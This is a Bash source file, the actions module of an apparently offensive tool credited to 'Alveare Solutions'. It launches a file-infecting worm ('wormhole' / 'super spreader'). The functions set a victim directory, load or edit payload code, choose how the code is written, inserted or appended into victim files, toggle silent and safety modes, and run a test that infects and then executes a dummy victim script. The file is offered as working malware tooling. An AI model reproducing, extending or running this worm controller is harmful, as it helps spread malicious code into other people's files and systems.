#!/bin/bash
#
# Regards, the Alveare Solutions society.
#
# ACTIONS

function action_self_destruct () {
    check_safety_on
    if [ $? -eq 0 ]; then
        echo; warning_msg "Safety is (${GREEN}ON${RESET})."\
            "Aborting self destruct sequence."
        return 0
    fi
    echo; warning_msg "Initiating (${BLUE}$SCRIPT_NAME${RESET})"\
        "self destruct sequence!"
    self_destruct
    return $?
}

function action_release_super_spreader () {
    check_safety_on
    if [ $? -eq 0 ]; then
        echo; warning_msg "Safety is (${GREEN}ON${RESET})."\
            "Victim is not beeing infected."
        return 1
    fi
    echo; info_msg "Releasing super spreader:"
    ${PW_CARGO['wormhole']} \
        -d "${MD_DEFAULT['victim-dir']}" \
        -p "${PW_IMPORTS['payload-file']}" \
        -s "${MD_DEFAULT['silent']}" \
        -c "${MD_DEFAULT['payload-code']}" \
        -m "${MD_DEFAULT['insertion-mode']}"
    return $?
}

function action_controlled_test_run () {
    local OLD_PAYLOAD="${PW_IMPORTS['payload-file']}"
    local OLD_VICTIM_DIRECTORY="${MD_DEFAULT['victim-dir']}"
    local OLD_SILENT_FLAG="${MD_DEFAULT['silent']}"
    local OLD_PAYLOAD_CODE="${MD_DEFAULT['payload-code']}"
    set_loaded_payload 'dummy'
    set_victim_directory_path "${MD_DEFAULT['src-dir']}"
    set_payload_code "print('Dummy payload last minute extension.')"
    set_silent_flag 'off'
    echo "#!/usr/bin/python3
print('This should have printed anyway, nothing to see here.')
    " > ${MD_DEFAULT['test-victim']}
    echo; info_msg "Initiated controlled test run:

    ${RED}________WORHMOLE_______${RESET}
    [ ${BLUE}VICTIM DIRECTORY${RESET}    ]: ${RED}${MD_DEFAULT['victim-dir']}${RESET}
    [ ${RED}PAYLOAD FILE${RESET}        ]: ${RED}${PW_IMPORTS['payload-file']}${RESET}
    [ ${CYAN}SILENT FLAG${RESET}         ]: ${MD_DEFAULT['silent']}
    [ ${CYAN}CODE INSERTION MODE${RESET} ]: ${MAGENTA}${MD_DEFAULT['insertion-mode']}${RESET}"
    action_release_super_spreader
    set_imported_payload_file "$OLD_PAYLOAD"
    set_victim_directory_path "$OLD_VICTIM_DIRECTORY"
    set_payload_code "$OLD_PAYLOAD_CODE"
    set_silent_flag "$OLD_SILENT_FLAG"
    echo; info_msg "Executing infected victim"\
        "(${RED}${MD_DEFAULT['test-victim']}${RESET})"
    ${MD_DEFAULT['test-victim']}
    return 0
}

function action_wormhole_help () {
    echo; info_msg "Select cargo script to view instructions for:
    "
    CLI_CARGO=`fetch_selection_from_user "Help" ${!PW_CARGO[@]}`
    if [ $? -ne 0 ]; then
        return 1
    fi
    ${PW_CARGO[$CLI_CARGO]} --help
    return $?
}

function action_set_payload () {
    SELECTION_OPTIONS=( ${!PW_PAYLOAD[@]} )
    echo; info_msg "Select payload:
        "
    PAYLOAD=`fetch_selection_from_user "Payload" "${SELECTION_OPTIONS[@]}"`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    echo; set_loaded_payload "$PAYLOAD"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set payload (${RED}$PAYLOAD${RESET})."
    else
        ok_msg "Successfully set payload (${GREEN}$PAYLOAD${RESET})"
    fi
    return $EXIT_CODE
}

function action_set_silent_flag_on () {
    echo; qa_msg "Getting scared, are we?"
    fetch_ultimatum_from_user "${YELLOW}Y/N${RESET}"
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    set_silent_flag 'on'
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$SCRIPT_NAME${RESET}) silence"\
            "to (${GREEN}ON${RESET})."
    else
        ok_msg "Succesfully set (${BLUE}$SCRIPT_NAME${RESET}) silence"\
            "to (${GREEN}ON${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_silent_flag_off () {
    echo; qa_msg "Taking off the training wheels. Are you sure about this?"
    fetch_ultimatum_from_user "${YELLOW}Y/N${RESET}"
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
    fi
    set_silent_flag 'off'
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$SCRIPT_NAME${RESET}) safety"\
            "to (${RED}OFF${RESET})."
    else
        ok_msg "Succesfully set (${BLUE}$SCRIPT_NAME${RESET}) safety"\
            "to (${RED}OFF${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_victim_directory_path () {
    echo; info_msg "Type absolute directory path or (${MAGENTA}.back${RESET})."
    while :
    do
        DIR_PATH=`fetch_data_from_user 'DirectoryPath'`
        local EXIT_CODE=$?
        echo
        if [ $EXIT_CODE -ne 0 ]; then
            info_msg "Aborting action."
            return 1
        fi
        if [[ "${MD_DEFAULT['target']}" == 'local' ]]; then
            check_directory_exists "$DIR_PATH"
            if [ $? -ne 0 ]; then
                warning_msg "Directory (${RED}$DIR_PATH${RESET}) does not exists."
                echo; continue
            fi
        fi
        break
    done
    set_victim_directory_path "$DIR_PATH"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$DIR_PATH${RESET}) as victim directory."
    else
        ok_msg "Successfully set victim directory (${GREEN}$DIR_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_code_insertion_mode () {
    CODE_INSERTION_MODES=( 'write' 'insert' 'append' )
    echo; info_msg "Select payload code insertion priority mode:
    "
    INSERTION_MODE=`fetch_selection_from_user \
        "InsertionMode" ${CODE_INSERTION_MODES[@]}`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    echo; set_code_insertion_mode "$INSERTION_MODE"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) code insertion"\
            "priority mode  (${RED}$INSERTION_MODE${RESET})."
    else
        ok_msg "Successfully set code insertion priority mode"\
            "(${GREEN}$INSERTION_MODE${RESET})."
    fi
    return $EXIT_CODE
}

function action_import_payload_file () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        FILE_PATH=`fetch_data_from_user 'FilePath'`
        local EXIT_CODE=$?
        echo
        if [ $EXIT_CODE -ne 0 ]; then
            info_msg "Aborting action."
            return 1
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exists."
            echo; continue
        fi; break
    done
    set_imported_payload_file "$FILE_PATH"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not import payload file (${RED}$FILE_PATH${RESET})."
    else
        ok_msg "Successfully imported payload file (${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_edit_payload_file () {
    local FILE_PATH="${PW_IMPORTS['payload-file']}"
    echo
    if [ -z "${PW_IMPORTS['payload-file']}" ]; then
        warning_msg "No paylod file imported. Using default"\
            "(${YELLOW}${MD_DEFAULT['tmp-file']}${RESET})."
        local FILE_PATH="${MD_DEFAULT['tmp-file']}"
    fi
    info_msg "Opening payload file (${YELLOW}$FILE_PATH${RESET})"\
        "for editing using (${MAGENTA}${MD_DEFAULT['file-editor']}${RESET})..."
    ${MD_DEFAULT['file-editor']} $FILE_PATH
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not edit payload file (${RED}$FILE_PATH${RESET})."
    else
        check_file_empty "$FILE_PATH"
        if [ $? -eq 0 ]; then
            warning_msg "Payload file (${RED}$FILE_PATH${RESET}) is empty."
            return 3
        fi
        ok_msg "Successfully edited payload (${GREEN}$FILE_PATH${RESET})."
    fi
    if [ -z "${PW_IMPORTS['payload-file']}" ]; then
        set_payload_code "`cat $FILE_PATH`"
    fi
    return $EXIT_CODE
}

function action_install_dependencies () {
    echo
    fetch_ultimatum_from_user "Are you sure about this? ${YELLOW}Y/N${RESET}"
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    apt_install_dependencies && pip3_install_dependencies
    return $?
}

function action_set_temporary_file () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        FILE_PATH=`fetch_data_from_user 'FilePath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 1
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exists."
            echo; continue
        fi; break
    done
    set_temporary_file "$FILE_PATH"
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_PATH${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) temporary file."
    else
        ok_msg "Successfully set temporary file (${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_safety_on () {
    echo; qa_msg "Getting scared, are we?"
    fetch_ultimatum_from_user "${YELLOW}Y/N${RESET}"
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    set_safety 'on'
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) safety"\
            "to (${GREEN}ON${RESET})."
    else
        ok_msg "Succesfully set (${BLUE}$SCRIPT_NAME${RESET}) safety"\
            "to (${GREEN}ON${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_safety_off () {
    echo; qa_msg "Taking off the training wheels. Are you sure about this?"
    fetch_ultimatum_from_user "${YELLOW}Y/N${RESET}"
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
    fi
    set_safety 'off'
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) safety"\
            "to (${RED}OFF${RESET})."
    else
        ok_msg "Succesfully set (${BLUE}$SCRIPT_NAME${RESET}) safety"\
            "to (${RED}OFF${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_log_file () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        FILE_PATH=`fetch_data_from_user 'FilePath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 1
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exists."
            echo; continue
        fi; break
    done
    echo; set_log_file "$FILE_PATH"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_PATH${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) log file."
    else
        ok_msg "Successfully set (${BLUE}$SCRIPT_NAME${RESET}) log file"\
            "(${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_log_lines () {
    echo; info_msg "Type log line number to display or (${MAGENTA}.back${RESET})."
    while :
    do
        LOG_LINES=`fetch_data_from_user 'LogLines'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 1
        fi
        check_value_is_number $LOG_LINES
        if [ $? -ne 0 ]; then
            warning_msg "LogViewer number of lines required,"\
                "not (${RED}$LOG_LINES${RESET})."
            echo; continue
        fi; break
    done
    echo; set_log_lines $LOG_LINES
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) default"\
            "${RED}log lines${RESET} to (${RED}$LOG_LINES${RESET})."
    else
        ok_msg "Successfully set ${BLUE}$SCRIPT_NAME${RESET} default"\
            "${GREEN}log lines${RESET} to (${GREEN}$LOG_LINES${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_file_editor () {
    echo; info_msg "Type file editor name or ${MAGENTA}.back${RESET}."
    while :
    do
        FILE_EDITOR=`fetch_data_from_user 'Editor'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 1
        fi
        check_util_installed "$FILE_EDITOR"
        if [ $? -ne 0 ]; then
            warning_msg "File editor (${RED}$FILE_EDITOR${RESET}) is not installed."
            echo; continue
        fi; break
    done
    set_file_editor "$FILE_EDITOR"
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_EDITOR${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) default file editor."
    else
        ok_msg "Successfully set default file editor"\
            "(${GREEN}$FILE_EDITOR${RESET})."
    fi
    return $EXIT_CODE
}


